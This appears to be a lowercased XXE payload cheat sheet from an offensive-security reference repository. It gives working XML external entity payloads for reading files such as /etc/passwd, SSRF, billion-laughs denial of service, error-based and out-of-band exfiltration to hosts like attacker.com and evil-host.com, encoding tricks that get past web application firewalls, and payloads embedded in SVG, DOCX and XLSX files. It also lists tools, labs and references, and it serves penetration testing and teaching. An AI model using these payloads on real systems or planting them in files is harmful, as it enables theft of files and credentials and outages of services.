# xml external entity

> an xml external entity attack is a type of attack against an application that parses xml input and allows xml entities. xml entities can be used to tell the xml parser to fetch specific content on the server.

## summary

- [tools](#tools)
- [detect the vulnerability](#detect-the-vulnerability)
- [exploiting xxe to retrieve files](#exploiting-xxe-to-retrieve-files)
    - [classic xxe](#classic-xxe)
    - [classic xxe base64 encoded](#classic-xxe-base64-encoded)
    - [php wrapper inside xxe](#php-wrapper-inside-xxe)
    - [xinclude attacks](#xinclude-attacks)
- [exploiting xxe to perform ssrf attacks](#exploiting-xxe-to-perform-ssrf-attacks)
- [exploiting xxe to perform a denial of service](#exploiting-xxe-to-perform-a-denial-of-service)
    - [billion laugh attack](#billion-laugh-attack)
    - [yaml attack](#yaml-attack)
    - [parameters laugh attack](#parameters-laugh-attack)
- [exploiting error based xxe](#exploiting-error-based-xxe)
    - [error based - using local dtd file](#error-based---using-local-dtd-file)
        - [linux local dtd](#linux-local-dtd)
        - [windows local dtd](#windows-local-dtd)
    - [error based - using remote dtd](#error-based---using-remote-dtd)
- [exploiting blind xxe to exfiltrate data out of band](#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
    - [basic blind xxe](#basic-blind-xxe)
    - [out of band xxe](#out-of-band-xxe)
    - [xxe oob with dtd and php filter](#xxe-oob-with-dtd-and-php-filter)
    - [xxe oob with apache karaf](#xxe-oob-with-apache-karaf)
- [waf bypasses](#waf-bypasses)
    - [bypass via character encoding](#bypass-via-character-encoding)
    - [xxe on json endpoints](#xxe-on-json-endpoints)
- [xxe in exotic files](#xxe-in-exotic-files)
    - [xxe inside svg](#xxe-inside-svg)
    - [xxe inside soap](#xxe-inside-soap)
    - [xxe inside docx file](#xxe-inside-docx-file)
    - [xxe inside xlsx file](#xxe-inside-xlsx-file)
    - [xxe inside dtd file](#xxe-inside-dtd-file)
- [labs](#labs)
- [references](#references)

## tools

- [staaldraad/xxeftp](https://github.com/staaldraad/xxeserv) - a mini webserver with ftp support for xxe payloads
- [lc/230-oob](https://github.com/lc/230-oob) - an out-of-band xxe server for retrieving file contents over ftp and payload generation via [http://xxe.sh/](http://xxe.sh/)
- [enjoiz/xxeinjector](https://github.com/enjoiz/xxeinjector) - tool for automatic exploitation of xxe vulnerability using direct and different out of band methods
- [buffalowill/oxml_xxe](https://github.com/buffalowill/oxml_xxe) - a tool for embedding xxe/xml exploits into different filetypes (docx/xlsx/pptx, odt/odg/odp/ods, svg, xml, pdf, jpg, gif)
- [whitel1st/docem](https://github.com/whitel1st/docem) - utility to embed xxe and xss payloads in docx,odt,pptx,etc
- [bytehope/wwe](https://github.com/bytehope/wwe) - poc tool (based on wrapwrap & lightyear ) to demonstrate xxe in php with only libxml_dtdload or libxml_dtdattr flag set

## detect the vulnerability

**internal entity**: if an entity is declared within a dtd it is called an internal entity.
syntax: `<!entity entity_name "entity_value">`

**external entity**: if an entity is declared outside a dtd it is called an external entity. identified by `system`.
syntax: `<!entity entity_name system "entity_value">`

basic entity test, when the xml parser parses the external entities the result should contain "john" in `firstname` and "doe" in `lastname`. entities are defined inside the `doctype` element.

```xml
<!--?xml version="1.0" ?-->
<!doctype replace [<!entity example "doe"> ]>
 <userinfo>
  <firstname>john</firstname>
  <lastname>&example;</lastname>
 </userinfo>
```

it might help to set the `content-type: application/xml` in the request when sending xml payload to the server.

## exploiting xxe to retrieve files

### classic xxe

we try to display the content of the file `/etc/passwd`.

```xml
<?xml version="1.0"?><!doctype root [<!entity test system 'file:///etc/passwd'>]><root>&test;</root>
```

```xml
<?xml version="1.0"?>
<!doctype data [
<!element data (#any)>
<!entity file system "file:///etc/passwd">
]>
<data>&file;</data>
```

```xml
<?xml version="1.0" encoding="iso-8859-1"?>
  <!doctype foo [
  <!element foo any >
  <!entity xxe system "file:///etc/passwd" >]><foo>&xxe;</foo>
```

```xml
<?xml version="1.0" encoding="iso-8859-1"?>
<!doctype foo [
  <!element foo any >
  <!entity xxe system "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```

:warning: `system` and `public` are almost synonym.

```ps1
<!entity % xxe public "random text" "url">
<!entity xxe public "any text" "url">
```

### classic xxe base64 encoded

```xml
<!doctype test [ <!entity % init system "data://text/plain;base64,zmlsztovly9ldgmvcgfzc3dk"> %init; ]><foo/>
```

### php wrapper inside xxe

```xml
<!doctype replace [<!entity xxe system "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>jean &xxe; dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du ctf</address>
    <zipcode>75000</zipcode>
    <city>paris</city>
  </contact>
</contacts>
```

```xml
<?xml version="1.0" encoding="iso-8859-1"?>
<!doctype foo [
<!element foo any >
<!entity % xxe system "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>
```

### xinclude attacks

when you can't modify the **doctype** element use the **xinclude** to target

```xml
<foo xmlns:xi="http://www.w3.org/2001/xinclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## exploiting xxe to perform ssrf attacks

xxe can be combined with the [ssrf vulnerability](https://github.com/swisskyrepo/payloadsallthethings/tree/master/server%20side%20request%20forgery) to target another service on the network.

```xml
<?xml version="1.0" encoding="iso-8859-1"?>
<!doctype foo [
<!element foo any >
<!entity % xxe system "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```

## exploiting xxe to perform a denial of service

:warning: : these attacks might kill the service or the server, do not use them on the production.

### billion laugh attack

```xml
<!doctype data [
<!entity a0 "dos" >
<!entity a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!entity a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!entity a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!entity a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

### yaml attack

```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

### parameters laugh attack

a variant of the billion laughs attack, using delayed interpretation of parameter entities, by sebastian pipping.

```xml
<!doctype r [
  <!entity % pe_1 "<!---->">
  <!entity % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
  <!entity % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
  <!entity % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
  %pe_4;
]>
<r/>
```

## exploiting error based xxe

### error based - using local dtd file

if error based exfiltration is possible, you can still rely on a local dtd to do concatenation tricks. payload to confirm that error message include filename.

```xml
<!doctype root [
    <!entity % local_dtd system "file:///abcxyz/">
    %local_dtd;
]>
<root></root>
```

- [gosecure/dtd-finder](https://github.com/gosecure/dtd-finder/blob/master/list/xxe_payloads.md) - list dtds and generate xxe payloads using those local dtds.

#### linux local dtd

short list of dtd files already stored on linux systems; list them with `locate .dtd`:

```xml
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/share/xml/svg/svg10.dtd
/usr/share/xml/svg/svg11.dtd
/usr/share/yelp/dtd/docbookx.dtd
```

the file `/usr/share/xml/fontconfig/fonts.dtd` has an injectable entity `%constant` at line 148: `<!entity % constant 'int|double|string|matrix|bool|charset|langset|const'>`

the final payload becomes:

```xml
<!doctype message [
    <!entity % local_dtd system "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!entity % constant 'aaa)>
            <!entity &#x25; file system "file:///etc/passwd">
            <!entity &#x25; eval "<!entity &#x26;#x25; error system &#x27;file:///patt/&#x25;file;&#x27;>">
            &#x25;eval;
            &#x25;error;
            <!element aa (bb'>
    %local_dtd;
]>
<message>text</message>
```

#### windows local dtd

payloads from [infosec-au/xxe-windows.md](https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79).

- disclose local file

  ```xml
  <!doctype doc [
      <!entity % local_dtd system "file:///c:\windows\system32\wbem\xml\cim20.dtd">
      <!entity % superclass '>
          <!entity &#x25; file system "file://d:\webserv2\services\web.config">
          <!entity &#x25; eval "<!entity &#x26;#x25; error system &#x27;file://t/#&#x25;file;&#x27;>">
          &#x25;eval;
          &#x25;error;
        <!entity test "test"'
      >
      %local_dtd;
    ]><xxx>anything</xxx>
  ```

- disclose http response

  ```xml
  <!doctype doc [
      <!entity % local_dtd system "file:///c:\windows\system32\wbem\xml\cim20.dtd">
      <!entity % superclass '>
          <!entity &#x25; file system "https://erp.company.com">
          <!entity &#x25; eval "<!entity &#x26;#x25; error system &#x27;file://test/#&#x25;file;&#x27;>">
          &#x25;eval;
          &#x25;error;
        <!entity test "test"'
      >
      %local_dtd;
    ]><xxx>anything</xxx>
  ```

### error based - using remote dtd

**payload to trigger the xxe**:

```xml
<?xml version="1.0" ?>
<!doctype message [
    <!entity % ext system "http://attacker.com/ext.dtd">
    %ext;
]>
<message></message>
```

**content of ext.dtd**:

```xml
<!entity % file system "file:///etc/passwd">
<!entity % eval "<!entity &#x25; error system 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**alternative content of ext.dtd**:

```xml
<!entity % data system "file:///etc/passwd">
<!entity % eval "<!entity &#x25; leak system '%data;:///'>">
%eval;
%leak;
```

let's break down the payload:

1. `<!entity % file system "file:///etc/passwd">`
  this line defines an external entity named file that references the content of the file /etc/passwd (a unix-like system file containing user account details).
2. `<!entity % eval "<!entity &#x25; error system 'file:///nonexistent/%file;'>">`
  this line defines an entity eval that holds another entity definition. this other entity (error) is meant to reference a nonexistent file and append the content of the file entity (the `/etc/passwd` content) to the end of the file path. the `&#x25;` is a url-encoded '`%`' used to reference an entity inside an entity definition.
3. `%eval;`
  this line uses the eval entity, which causes the entity error to be defined.
4. `%error;`
  finally, this line uses the error entity, which attempts to access a nonexistent file with a path that includes the content of `/etc/passwd`. since the file doesn't exist, an error will be thrown. if the application reports back the error to the user and includes the file path in the error message, then the content of `/etc/passwd` would be disclosed as part of the error message, revealing sensitive information.

## exploiting blind xxe to exfiltrate data out of band

sometimes you won't have a result outputted in the page but you can still extract the data with an out of band attack.

### basic blind xxe

the easiest way to test for a blind xxe is to try to load a remote resource such as a burp collaborator.

```xml
<?xml version="1.0" ?>
<!doctype root [
<!entity % ext system "http://unique_id_for_burp_collaborator.burpcollaborator.net/x"> %ext;
]>
<r></r>
```

```xml
<!doctype root [<!entity test system 'http://unique_id_for_burp_collaborator.burpcollaborator.net'>]>
<root>&test;</root>
```

send the content of `/etc/passwd` to "www.malicious.com", you may receive only the first line.

```xml
<?xml version="1.0" encoding="iso-8859-1"?>
<!doctype foo [
<!element foo any >
<!entity % xxe system "file:///etc/passwd" >
<!entity callhome system "www.malicious.com/?%xxe;">
]
>
<foo>&callhome;</foo>
```

### out of band xxe

> yunusov, 2013

```xml
<?xml version="1.0" encoding="utf-8"?>
<!doctype data system "http://publicserver.com/parameterentity_oob.dtd">
<data>&send;</data>

file stored on http://publicserver.com/parameterentity_oob.dtd
<!entity % file system "file:///sys/power/image_size">
<!entity % all "<!entity send system 'http://publicserver.com/?%file;'>">
%all;
```

### xxe oob with dtd and php filter

```xml
<?xml version="1.0" ?>
<!doctype r [
<!element r any >
<!entity % sp system "http://127.0.0.1/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

file stored on http://127.0.0.1/dtd.xml
<!entity % data system "php://filter/convert.base64-encode/resource=/etc/passwd">
<!entity % param1 "<!entity exfil system 'http://127.0.0.1/dtd.xml?%data;'>">
```

### xxe oob with apache karaf

cve-2018-11788 affecting versions:

- apache karaf <= 4.2.1
- apache karaf <= 4.1.6

```xml
<?xml version="1.0" encoding="utf-8"?>
<!doctype doc [<!entity % dtd system "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"
        xsi:schemalocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="deployer" version="2.0" install="auto">
    </feature>
</features>
```

send the xml file to the `deploy` folder.

ref. [brianwrf/cve-2018-11788](https://github.com/brianwrf/cve-2018-11788)

## waf bypasses

### bypass via character encoding

xml parsers uses 4 methods to detect encoding:

- http content type: `content-type: text/xml; charset=utf-8`
- reading byte order mark (bom)
- reading first symbols of document
    - utf-8 (3c 3f 78 6d)
    - utf-16be (00 3c 00 3f)
    - utf-16le (3c 00 3f 00)
- xml declaration: `<?xml version="1.0" encoding="utf-8"?>`

| encoding | bom      | example                             |              |
| -------- | -------- | ----------------------------------- | ------------ |
| utf-8    | ef bb bf | ef bb bf 3c 3f 78 6d 6c             | ...<?xml     |
| utf-16be | fe ff    | fe ff 00 3c 00 3f 00 78 00 6d 00 6c | ...<.?.x.m.l |
| utf-16le | ff fe    | ff fe 3c 00 3f 00 78 00 6d 00 6c 00 | ..<.?.x.m.l. |

**example**: we can convert the payload to `utf-16` using [iconv](https://man7.org/linux/man-pages/man1/iconv.1.html) to bypass some waf:

```bash
cat utf8exploit.xml | iconv -f utf-8 -t utf-16be > utf16exploit.xml
```

### xxe on json endpoints

in the http request try to switch the `content-type` from **json** to **xml**,

| content type       | data                               |
| ------------------ | ---------------------------------- |
| `application/json` | `{"search":"name","value":"test"}` |
| `application/xml`  | `<?xml version="1.0" encoding="utf-8" ?><root><search>name</search><value>data</value></root>` |

- xml documents must contain one root (`<root>`) element that is the parent of all other elements.
- the data must be converted to xml too, otherwise the server will respond with an error.

```json
{
  "errors":{
    "errormessage":"org.xml.sax.saxparseexception: xml document structures must start and end within the same entity."
  }
}
```

- [netspi/content-type converter](https://github.com/netspi/burp-extensions/releases/tag/1.4)

## xxe in exotic files

### xxe inside svg

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls" width="200" height="200"></image>
</svg>
```

**classic**:

```xml
<?xml version="1.0" standalone="yes"?>
<!doctype test [ <!entity xxe system "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**oob via svg rasterization**:

_xxe.svg_:

```xml
<?xml version="1.0" standalone="yes"?>
<!doctype svg [
<!element svg any >
<!entity % sp system "http://example.org:8080/xxe.xml">
%sp;
%param1;
]>
<svg viewbox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">xxe via svg rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowroot font-size="15">
         <flowregion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowregion>
         <flowdiv>
            <flowpara>&exfil;</flowpara>
         </flowdiv>
      </flowroot>
</svg>
```

_xxe.xml_:

```xml
<!entity % data system "php://filter/convert.base64-encode/resource=/etc/hostname">
<!entity % param1 "<!entity exfil system 'ftp://example.org:2121/%data;'>">
```

### xxe inside soap

```xml
<soap:body>
  <foo>
    <![cdata[<!doctype doc [<!entity % dtd system "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:body>
```

### xxe inside docx file

format of an open xml file (inject the payload in any .xml file):

- /_rels/.rels
- [content_types].xml
- default main document part
    - /word/document.xml
    - /ppt/presentation.xml
    - /xl/workbook.xml

then update the file `zip -u xxe.docx [content_types].xml`

tool : <https://github.com/buffalowill/oxml_xxe>

```xml
docx/xlsx/pptx
odt/odg/odp/ods
svg
xml
pdf (experimental)
jpg (experimental)
gif (experimental)
```

### xxe inside xlsx file

structure of the xlsx:

```ps1
$ 7z l xxe.xlsx
[...]
   date      time    attr         size   compressed  name
------------------- ----- ------------ ------------  ------------------------
2021-10-17 15:19:00 .....          578          223  _rels/.rels
2021-10-17 15:19:00 .....          887          508  xl/workbook.xml
2021-10-17 15:19:00 .....         4451          643  xl/styles.xml
2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml
2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels
2021-10-17 15:19:00 .....          201          160  xl/sharedstrings.xml
2021-10-17 15:19:00 .....          731          352  docprops/core.xml
2021-10-17 15:19:00 .....          410          246  docprops/app.xml
2021-10-17 15:19:00 .....         1367          345  [content_types].xml
------------------- ----- ------------ ------------  ------------------------
2021-10-17 15:19:00              11216         3586  9 files
```

extract excel file: `7z x -oxxe xxe.xlsx`

rebuild excel file:

```ps1
cd xxe
zip -r -u ../xxe.xlsx *
```

warning: use `zip -u` (<https://infozip.sourceforge.net/zip.html>) and not `7z u` / `7za u` (<https://p7zip.sourceforge.net/>) or `7zz` (<https://www.7-zip.org/>) because they won't recompress it the same way and many excel parsing libraries will fail to recognize it as a valid excel file. a valid  magic byte signature with (`file xxe.xlsx`) will be shown as `microsoft excel 2007+` (with `zip -u`) and an invalid one will be shown as `microsoft ooxml`.

add your blind xxe payload inside `xl/workbook.xml`.

```xml
<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<!doctype cdl [<!element cdl any ><!entity % asd system "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officedocument/2006/relationships">
```

alternatively, add your payload in `xl/sharedstrings.xml`:

```xml
<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<!doctype cdl [<!element t any ><!entity % asd system "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniquecount="10"><si><t>&rrr;</t></si><si><t>testa2</t></si><si><t>testa3</t></si><si><t>testa4</t></si><si><t>testa5</t></si><si><t>testb1</t></si><si><t>testb2</t></si><si><t>testb3</t></si><si><t>testb4</t></si><si><t>testb5</t></si></sst>
```

using a remote dtd will save us the time to rebuild a document each time we want to retrieve a different file.
instead we build the document once and then change the dtd.
and using ftp instead of http allows to retrieve much larger files.

`xxe.dtd`

```xml
<!entity % d system "file:///etc/passwd">
<!entity % c "<!entity rrr system 'ftp://x.x.x.x:2121/%d;'>">
```

serve dtd and receive ftp payload using [staaldraad/xxeserv](https://github.com/staaldraad/xxeserv):

```ps1
xxeserv -o files.log -p 2121 -w -wd public -wp 8000
```

### xxe inside dtd file

most xxe payloads detailed above require control over both the dtd or `doctype` block as well as the `xml` file.
in rare situations, you may only control the dtd file and won't be able to modify the `xml` file. for example, a mitm.
when all you control is the dtd file, and you do not control the `xml` file, xxe may still be possible with this payload.

```xml
<!-- load the contents of a sensitive file into a variable -->
<!entity % payload system "file:///etc/passwd">
<!-- use that variable to construct an http get request with the file contents in the url -->
<!entity % param1 '<!entity &#37; external system "http://my.evil-host.com/x=%payload;">'>
%param1;
%external;
```

## labs

- [root me - xml external entity](https://www.root-me.org/en/challenges/web-server/xml-external-entity)
- [portswigger labs for xxe](https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection)
    - [exploiting xxe using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)
    - [exploiting xxe to perform ssrf attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)
    - [blind xxe with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
    - [blind xxe with out-of-band interaction via xml parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)
    - [exploiting blind xxe to exfiltrate data using a malicious external dtd](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)
    - [exploiting blind xxe to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)
    - [exploiting xinclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)
    - [exploiting xxe via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
    - [exploiting xxe to retrieve data by repurposing a local dtd](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)
- [gosecure workshop - advanced xxe exploitation](https://gosecure.github.io/xxe-workshop)

## references

- [a deep dive into xxe injection - trenton gordon - july 22, 2019](https://www.synack.com/blog/a-deep-dive-into-xxe-injection/)
- [automating local dtd discovery for xxe exploitation - philippe arteau - july 16, 2019](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation)
- [blind oob xxe at uber 26+ domains hacked - raghav bisht - august 5, 2016](http://nerdint.blogspot.hk/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html)
- [cve-2019-8986: soap xxe in tibco jasperreports server - julien szlamowicz, sebastien dudek - march 11, 2019](https://www.synacktiv.com/ressources/advisories/tibco_jasperreports_server_xxe.pdf)
- [data exfiltration using xxe on a hardened server - ritik singh - january 29, 2022](https://infosecwriteups.com/data-exfiltration-using-xxe-on-a-hardened-server-ef3a3e5893ac)
- [detecting and exploiting xxe in saml interfaces - christian mainka (@chearix) - november 6, 2014](http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html)
- [exploiting xxe in file upload functionality - will vandevanter (@_will_is_) - november 19, 2015](https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf)
- [exploiting xxe with excel - marc wickenden - november 12, 2018](https://www.4armed.com/blog/exploiting-xxe-with-excel/)
- [exploiting xxe with local dtd files - arseniy sharoglazov - december 12, 2018](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
- [from blind xxe to root-level file read access - pieter hiele - december 12, 2018](https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/)
- [how we got read access on google’s production servers - detectify - april 11, 2014](https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/)
- [impossible xxe in php - aleksandr zhurnakov - march 11, 2025](https://swarm.ptsecurity.com/impossible-xxe-in-php/)
- [midnight sun ctf 2019 quals - rubenscube - jbz - april 6, 2019](https://jbz.team/midnightsunctfquals2019/rubenscube)
- [oob xxe through saml - sean melia (@seanmeals) - january 2016](https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf)
- [payloads for cisco and citrix - arseniy sharoglazov - january 1, 2016](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
- [pentest xxe - @phonexicum - march 9, 2020](https://phonexicum.github.io/infosec/xxe.html)
- [playing with content-type – xxe on json endpoints - antti rantasaari - april 20, 2015](https://www.netspi.com/blog/technical-blog/web-application-pentesting/playing-content-type-xxe-json-endpoints/)
- [redteam tales 0x1: soapy xxe - uncover and exploit xxe vulnerability in soap ws - optistream - may 27, 2024](https://www.optistream.io/blogs/tech/redteam-stories-1-soapy-xxe)
- [xml attacks - mariusz banach (@mgeeky) - december 21, 2017](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)
- [xml external entity (xxe) injection - portswigger - may 29, 2019](https://portswigger.net/web-security/xxe)
- [xml external entity (xxe) processing - owasp - december 4, 2019](https://www.owasp.org/index.php/xml_external_entity_(xxe)_processing)
- [xml external entity prevention cheat sheet - owasp - february 16, 2019](https://cheatsheetseries.owasp.org/cheatsheets/xml_external_entity_prevention_cheat_sheet.html)
- [xxe all the things!!! (including apple ios's office viewer) - bruno morisson - august 14, 2015](https://labs.integrity.pt/articles/xxe-all-the-things-including-apple-ioss-office-viewer/)
- [xxe in uber to read local files - httpsonly - january 24, 2017](https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html)
- [xxe inside svg - yeo quan yang - june 22, 2016](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)
- [xxe payloads - etienne stalmans (@staaldraad) - july 7, 2016](https://gist.github.com/staaldraad/01415b990939494879b4)
- [xxe: how to become a jedi - yaroslav babin - november 6, 2018](https://2017.zeronights.org/wp-content/uploads/materials/zn17_yarbabin_xxe_jedi_babin.pdf)
